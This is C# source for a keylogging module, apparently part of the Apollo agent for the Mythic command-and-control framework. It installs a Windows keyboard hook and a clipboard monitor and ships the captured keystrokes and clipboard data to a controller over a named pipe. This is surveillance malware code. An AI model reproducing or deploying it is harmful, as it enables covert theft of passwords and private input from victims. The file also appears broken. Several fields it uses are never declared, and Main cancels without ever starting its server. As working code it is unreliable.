﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Serializers;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using static KeylogInject.Native;
using System.Collections.Concurrent;
using ApolloInterop.Classes;
using System.IO.Pipes;

namespace KeylogInject
{
    class Program
    {
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static CancellationTokenSource _cts = new CancellationTokenSource();

        private static ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
        private static bool _completed = false;
        private static AutoResetEvent _completeEvent = new AutoResetEvent(false);
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static Task _flushTask;
        private static Action<object> _flushAction;

        private static IntPtr _hookIdentifier = IntPtr.Zero;

        static void Main(string[] args)
        {
#if DEBUG
            _namedPipeName = "keylogtest";
#else
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];
#endif
            _flushAction = new Action<object>((object p) =>
            {
                PipeStream ps = (PipeStream)p;
                WaitHandle[] waiters = new WaitHandle[]
                {
                    _completeEvent,
                    _senderEvent
                };
                while (!_completed && ps.IsConnected)
                {
                    WaitHandle.WaitAny(waiters, 1000);
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, ps);
                    }
                }
                ps.Flush();
                ps.Close();
            });
            _flushTask = new Task(_flushAction, null);
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            _server.Disconnect += ServerDisconnect;
            
            
            _cts.Cancel();
        }

        private static void StartKeylog()
        {
            ClipboardNotification.LogMessage = _keylogs.Add;
            Keylogger.LogMessage = _keylogs.Add;
            Thread t = new Thread(() => Application.Run(new ClipboardNotification()));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            _hookIdentifier = SetHook(Keylogger.HookCallback);
            try
            {
                Application.Run();
            }
            catch
            {

            }
            UnhookWindowsHookEx(_hookIdentifier);
        }

        private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
        {
            _cts.Cancel();
        }

        private static bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = _jsonSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach (IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            _senderEvent.Set();
            return true;
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
